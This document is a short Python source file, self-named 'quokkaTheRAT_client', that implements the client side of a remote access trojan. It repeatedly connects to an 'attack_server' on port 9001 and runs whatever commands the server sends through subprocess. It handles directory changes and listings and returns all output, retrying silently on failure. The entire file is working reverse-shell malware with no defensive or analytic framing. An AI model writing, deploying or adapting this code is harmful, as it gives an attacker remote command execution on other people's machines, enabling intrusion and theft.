# quokkaTheRAT_client
import os,socket,subprocess
import time,sys

port = 9001  #port of attack_server
host_addr = "localhost" #address of attack_server


def send_and_recv(conn_param,message): # safe send socket. restrict null message
    BUFFER_SIZE=10000
    if(message==''):
        print("null message error...") # safe send socket. restrict null message
        return 0
    conn_param.send(message.encode())
    print("wait for host message...")
    recved = conn_param.recv(BUFFER_SIZE).decode()
    print(recved)
    return recved

def send_s(conn_param,message): # safe send socket. restrict null message
    BUFFER_SIZE=10000
    if(message==''):
        print("null message error...") # safe send socket. restrict null message
        return 0
    try:
        conn_param.send(message.encode('utf-8'))
    except Exception as e:
        conn_param.send(message.encode('cp949'))


#### payload

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conn:
            conn.connect((host_addr, port))
            while True:
                server_cmd = conn.recv(10000).decode()
                if(server_cmd[:2]=="cd"): # cd makes shell change... so it required to handled as special command
                    os.chdir(str(server_cmd[3:]))
                    output=os.getcwd()
                    send_s(conn,output)
                elif(server_cmd[:2]=="ls"): # alter mojibake hangul
                    dir_list=os.listdir(os.getcwd())
                    send_s(conn,'\n'.join(dir_list))
                elif(server_cmd[:4]=="term"):
                    os._exit(0)
                else:
                    # no special command Handler
                    output=subprocess.getoutput(server_cmd)
                    send_s(conn,output) # send terminal output to server
    except Exception as e:
        print(e)
        pass